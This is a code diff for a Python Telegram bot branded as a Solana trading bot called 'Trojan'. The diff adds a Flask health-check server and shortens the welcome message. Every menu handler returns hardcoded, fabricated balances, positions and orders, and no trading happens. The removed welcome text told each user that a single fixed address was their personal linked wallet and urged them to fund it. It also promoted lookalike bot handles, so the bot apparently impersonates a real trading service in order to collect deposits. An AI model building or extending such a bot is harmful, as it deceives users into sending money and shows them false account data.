@@ -1,14 +1,22 @@
 import logging
 import os
+from flask import Flask, jsonify
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 
-# Set up logging to monitor errors and debug information
+# Set up logging
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
     level=logging.INFO,
 )
 logger = logging.getLogger(__name__)
+
+# Initialize Flask app
+app = Flask(__name__)
+
+@app.route("/")
+def health_check():
+    return jsonify({"status": "Bot is running", "message": "Welcome to Trojan Bot!"})
 
 # Define the main menu keyboard
 def main_menu_keyboard():
@@ -54,98 +62,88 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     # Send the welcome text
     welcome_message = (
-        "Introducing a cutting-edge bot crafted exclusively for Solana Traders. "
-        "Trade any token instantly right after launch.\n\n"
-        "Here's your Solana wallet address linked to your Telegram account. "
-        "Simply fund your wallet and dive into trading.\n\n"
-        "Solana Wallet Address:\n"
-        "AVXRzamEeoLD5vUUwdauK8928KPJ9iFuR163SYh28vy1\n\n"
-        "TAP TO COPY\n\n"
-        "Balance: (0.00) SOL\n\n"
-        "Click on the Refresh button to update your current balance.\n\n"
-        "Join our Telegram group @trojan for users of Trojan!\n\n"
-        "Use the following bots for faster trading:\n"
-        "@achilles_trojanbot | @odysseus_trojanbot | @Menelaus_trojanbot | "
-        "@Diomedes_trojanbot | @Paris_trojanbot | @Helenus_trojanbot | @Hector_trojanbot"
+        "Welcome to Trojan Bot! 🚀\n\n"
+        "Introducing a cutting-edge bot crafted exclusively for Solana Traders.\n"
+        "Trade any token instantly right after launch. Click a button to begin."
     )
     await update.message.reply_text(welcome_message, reply_markup=main_menu_keyboard())
 
 # Individual functions for each menu button
 async def buy_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    message = (
+    await update.callback_query.edit_message_text(
         "Buy $SLND- (Solend) 📈\n\n"
         "Balance: -_- SOL - W1 ✏️\n\n"
         "Price: $0.3594 - LIQ: $17.48K - MC: $35.94M\n\n"
-        "🔴 Insufficient balance for buy amount + gas."
+        "🔴 Insufficient balance for buy amount + gas.",
+        reply_markup=main_menu_keyboard()
     )
-    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())
 
 async def sell_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    message = (
+    await update.callback_query.edit_message_text(
         "Sell $SLND- (Solend) 📉\n\n"
         "Balance: 2.419 SOL\n\n"
         "Price: $0.3594 - LIQ: $17.48K - MC: $35.94M\n\n"
-        "Ready to sell? Please confirm the amount."
+        "Ready to sell? Please confirm the amount.",
+        reply_markup=main_menu_keyboard()
     )
-    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())
 
 async def positions_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    message = (
+    await update.callback_query.edit_message_text(
         "Current Positions 📊\n\n"
         "1. Position 1: $100 - Profit/Loss: +$5\n"
         "2. Position 2: $200 - Profit/Loss: -$10\n\n"
-        "Total Profit/Loss: -$5"
+        "Total Profit/Loss: -$5",
+        reply_markup=main_menu_keyboard()
     )
-    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())
 
 async def limit_orders_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    message = (
+    await update.callback_query.edit_message_text(
         "Active Limit Orders 🔒\n\n"
         "1. Order: 100 SOL at $0.35\n"
         "2. Order: 50 SOL at $0.40\n\n"
-        "Total Pending Orders: 2"
+        "Total Pending Orders: 2",
+        reply_markup=main_menu_keyboard()
     )
-    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())
 
 async def referrals_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    message = (
+    await update.callback_query.edit_message_text(
         "Your Referral Link 🧑‍💻\n\n"
         "Invite others and earn rewards!\n\n"
-        "Referral Link: https://yourreferral.link"
+        "Referral Link: https://yourreferral.link",
+        reply_markup=main_menu_keyboard()
     )
-    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())
 
 async def withdraw_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    message = (
+    await update.callback_query.edit_message_text(
         "Withdraw Funds 💸\n\n"
         "Enter the amount you wish to withdraw.\n\n"
-        "Available Balance: 2.419 SOL"
+        "Available Balance: 2.419 SOL",
+        reply_markup=main_menu_keyboard()
     )
-    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())
 
 async def copy_trade_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    message = (
+    await update.callback_query.edit_message_text(
         "Copy Trade Feature 📲\n\n"
         "Copy other traders' successful trades with one click!\n\n"
-        "To get started, choose a trader to copy."
+        "To get started, choose a trader to copy.",
+        reply_markup=main_menu_keyboard()
     )
-    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())
 
 async def settings_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    message = (
+    await update.callback_query.edit_message_text(
         "Settings ⚙️\n\n"
         "Here you can adjust your bot settings.\n\n"
-        "Choose an option to customize your experience."
+        "Choose an option to customize your experience.",
+        reply_markup=main_menu_keyboard()
     )
-    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())
 
 async def help_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    message = (
+    await update.callback_query.edit_message_text(
         "Need Help? 🤔\n\n"
         "If you're facing issues or need assistance, feel free to ask here. "
-        "You can contact our support team or join our Telegram group for updates."
+        "You can contact our support team or join our Telegram group for updates.",
+        reply_markup=main_menu_keyboard()
     )
-    await update.callback_query.edit_message_text(message, reply_markup=main_menu_keyboard())
 
 # Function to start the bot using polling
 def run_bot():
@@ -170,6 +168,14 @@ def run_bot():
     application.add_handler(CallbackQueryHandler(help_handler, pattern="^help$"))
 
     logger.info("Bot is running...")
+
+    # Run Flask in a separate thread
+    port = int(os.getenv("PORT", 5000))
+    import threading
+    flask_thread = threading.Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": port}, daemon=True)
+    flask_thread.start()
+
+    # Start Telegram polling
     application.run_polling()
 
 if __name__ == "__main__":
